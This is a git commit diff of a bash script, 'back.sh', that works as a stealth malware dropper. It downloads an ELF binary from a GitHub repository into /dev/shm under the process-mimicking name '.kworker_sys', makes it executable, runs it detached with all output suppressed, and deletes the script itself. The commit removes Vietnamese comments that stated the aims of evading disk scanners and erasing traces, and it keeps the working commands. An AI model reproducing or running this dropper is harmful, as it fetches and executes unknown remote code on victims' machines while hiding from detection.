84095ce06cafd7b9b780b5dcf4c415f01d1d666b
AnnaliseHackett <fdsjkrnennnnnnnnnnnnnnnnugierhguierhngiengioejgfmeofe@tempmail.ckvn.edu.vn>
2026-01-25 16:51:26 +0700

    Update back.sh

--- back.sh
+++ back.sh
@@ -1,17 +1,8 @@
 #!/bin/bash
-
-# 1. Tải file test.elf từ GitHub và lưu dưới tên ẩn trong RAM
-# Dùng /dev/shm để né các trình quét ổ cứng
 curl -sL https://github.com/AnnaliseHackett/Fix/raw/refs/heads/main/test.elf -o /dev/shm/.kworker_sys
-
-# 2. Cấp quyền thực thi
 chmod +x /dev/shm/.kworker_sys
-
-# 3. Chạy ngầm hoàn toàn và cắt đứt liên kết với terminal (tránh bị tắt khi thoát)
-# Điều hướng mọi log vào /dev/null để không hiện thông báo lạ
 nohup /dev/shm/.kworker_sys >/dev/null 2>&1 &
-
-# 4. Tự xóa file script cài đặt để xóa dấu vết
 rm -- "$0"
+
 
 
